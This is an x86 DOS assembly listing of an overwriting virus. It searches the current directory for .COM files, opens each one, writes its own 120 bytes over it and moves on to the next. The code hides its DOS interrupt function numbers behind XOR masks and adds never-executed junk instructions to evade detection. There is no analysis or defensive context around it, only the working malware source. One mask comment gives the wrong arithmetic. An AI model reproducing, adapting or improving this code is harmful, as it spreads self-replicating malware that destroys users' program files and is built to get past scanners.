.model small
.code
FNAME EQU 9EH ;search-function file name result
    ORG 100H
START:
    jmp REALSTART ; jump to the real start
    mov ax,03H ; insert some dummy instructions that are never executed
    xor cx,cx
    mov bx,ax
    xor bx,bx
    int 21H
    mov cx,bx
    push cx
    xor ax,ax
    mov dx,cx
    pop cx
    int 21H
    xor dx,dx
REALSTART:
    mov ah,7FH 
    xor ah,31H ; apply mask -> 7FH xor 31H = 4EH ;search for *.COM (search first)
    mov dx,OFFSET COM_FILE
    int 21H
SEARCH_LP:
    jc DONE
    mov ax,3D01H ;open file we found
    mov dx,FNAME
    int 21H
    xchg ax,bx ;write virus to file
    mov ah,12H
    xor ah,52H; apply mask -> 12H xor 52H = 40H
    mov cl,120 ;size of this virus
    mov dx,100H ;location of this virus
    int 21H
    mov ah,7EH
    xor ah,40h ; 7EH xor 40H = 3EH
    int 21H ;close file
    mov ah,0FH
    xor ah,40H ; 0FH xor 4FH = 4FH
    int 21H ;search for next file
    jmp SEARCH_LP
DONE:
    ret ;exit to DOS
COM_FILE DB '*.COM',0 ;string for COM file search
    END START